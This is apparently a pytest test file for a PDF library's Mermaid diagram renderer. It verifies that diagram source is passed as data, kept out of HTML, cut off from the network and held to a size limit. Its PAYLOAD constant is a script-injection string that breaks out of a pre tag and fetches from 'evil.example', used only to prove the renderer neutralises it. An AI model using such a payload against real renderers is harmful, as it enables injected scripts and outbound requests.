"""P0-03: Mermaid diagrams are data, never HTML; no CDN; bounded."""
import sys
import types
import pytest
from dynamic_pdf import DocumentBuilder, RenderPolicy, ResourceLimits
from dynamic_pdf.renderers import mermaid as M
from conftest import pdf_text

PAYLOAD = "graph TD; A-->B</pre><script>fetch('https://evil.example/x')</script>"


def test_harness_contains_no_diagram_and_no_cdn():
    assert "cdn" not in M.HARNESS_HTML.lower()
    assert "http://" not in M.HARNESS_HTML and "https://" not in M.HARNESS_HTML
    assert "Content-Security-Policy" in M.HARNESS_HTML
    assert "securityLevel: 'strict'" in M.RENDER_JS
    import inspect
    src = inspect.getsource(M)
    assert "jsdelivr" not in src and "{block.diagram}" not in src


def test_fallback_preserves_source_and_warns(monkeypatch):
    monkeypatch.delenv(M.MERMAID_JS_ENV, raising=False)
    b = DocumentBuilder().mermaid("graph TD; Alpha-->Beta")
    with pytest.warns(RuntimeWarning, match="mermaid_fallback"):
        pdf = b.render()
    assert "Alpha-->Beta" in pdf_text(pdf).replace(" ", "")
    assert b.diagnostics[0]["code"] == "mermaid_fallback"
    assert b.last_render.diagnostics.status == "ok"   # warning, not error


def test_diagram_passed_as_data_with_network_blocked(monkeypatch, tmp_path):
    """Drive render_mermaid against a fake Playwright to verify the call contract."""
    js = tmp_path / "mermaid.min.js"
    js.write_text("window.mermaid = {};")
    monkeypatch.setenv(M.MERMAID_JS_ENV, str(js))
    seen = {}

    from PIL import Image
    import io
    png = io.BytesIO()
    Image.new("RGB", (10, 10)).save(png, format="PNG")

    class Loc:
        first = property(lambda self: self)
        def screenshot(self): return png.getvalue()

    class Page:
        def set_default_timeout(self, ms): seen["timeout"] = ms
        def route(self, pattern, handler): seen["route"] = pattern
        def set_content(self, html): seen["html"] = html
        def add_script_tag(self, content): seen["script"] = content
        def evaluate(self, js, arg): seen["arg"] = arg; seen["js"] = js
        def locator(self, sel): return Loc()

    class Ctx:
        def new_page(self): return Page()

    class Browser:
        def new_context(self, **kw): seen["ctx"] = kw; return Ctx()
        def close(self): pass

    class PW:
        chromium = types.SimpleNamespace(launch=lambda: Browser())
        def __enter__(self): return self
        def __exit__(self, *a): return False

    fake = types.ModuleType("playwright.sync_api")
    fake.sync_playwright = lambda: PW()
    monkeypatch.setitem(sys.modules, "playwright", types.ModuleType("playwright"))
    monkeypatch.setitem(sys.modules, "playwright.sync_api", fake)

    DocumentBuilder().mermaid(PAYLOAD).render()
    assert seen["arg"] == PAYLOAD                  # passed as data
    assert PAYLOAD not in seen["html"]             # never in HTML
    assert "<script>" not in seen["html"]
    assert seen["route"] == "**/*"                 # all requests aborted
    assert seen["ctx"].get("offline") is True
    assert seen["timeout"] == 20000


def test_mermaid_size_limit():
    b = DocumentBuilder(policy=RenderPolicy(limits=ResourceLimits(max_mermaid_chars=10)))
    b.mermaid("graph TD; A-->B-->C-->D")
    with pytest.raises(Exception) as ei:
        b.render()
    assert "exceeds limit" in str(ei.value)
